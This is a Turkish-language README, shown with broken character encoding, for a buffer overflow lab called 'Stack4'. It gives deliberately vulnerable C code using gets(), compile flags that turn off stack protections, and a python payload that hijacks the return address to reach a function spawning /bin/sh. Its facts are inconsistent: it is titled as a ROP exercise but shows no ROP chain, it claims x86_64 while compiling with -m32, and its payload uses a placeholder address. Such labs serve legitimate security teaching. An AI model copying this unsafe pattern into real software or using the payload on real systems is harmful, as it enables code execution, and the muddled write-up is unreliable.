# Stack4 â€“ Return Oriented Programming (ROP) Basics

## ğŸ¯ AmaÃ§

Bir buffer overflow ile `changeme` fonksiyonuna deÄŸil, ROP chain aracÄ±lÄ±ÄŸÄ±yla Ã¶zel bir sistem Ã§aÄŸrÄ±sÄ±na yÃ¶nlendirme yapmak.

---

## ğŸ§ª Challenge Bilgileri

- Platform: Linux (x86_64)
- Zafiyet TÃ¼rÃ¼: Stack-based Buffer Overflow + ROP
- GÃ¼venlik Ã–zellikleri: No PIE, No Canary, No NX

---

## âš™ï¸ Derleme

```bash
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack4 stack4.c
```

---

## ğŸ” Kod Analizi

```c
void changeme() {
  printf("You changed control flow!\n");
  system("/bin/sh");
}

int main() {
  char buffer[64];
  gets(buffer);
  return 0;
}
```

---

## ğŸ§ª Exploit AÅŸamalarÄ±

### 1. `changeme()` fonksiyon adresini Ã¶ÄŸrenin

```bash
objdump -d stack4 | grep changeme
```

### 2. Payload oluÅŸturun

```bash
python3 -c 'print("A"*64 + "BBBB" + "\xef\xbe\xad\xde")' | ./stack4
```

### 3. GDB ile kontrol edin

```bash
gdb ./stack4
(gdb) run < <(python3 -c 'print("A"*64 + "BBBB" + "\xef\xbe\xad\xde")')
(gdb) info registers
```

---

## âœ… Beklenen Ã‡Ä±ktÄ±

```
You changed control flow!
$ whoami
```

---

## ğŸ“Œ Notlar

- `gets()` fonksiyonu klasik overflow Ã¶rneÄŸidir.
- ROP zinciri iÃ§in libc fonksiyonlarÄ± kullanÄ±labilir.
- NX devre dÄ±ÅŸÄ± olduÄŸu iÃ§in shellcode da yerleÅŸtirilebilir.

---

## ğŸ“š Kaynaklar

- https://exploit.education
- https://owasp.org/www-community/attacks/Buffer_overflow_attack
- https://ropemporium.com/
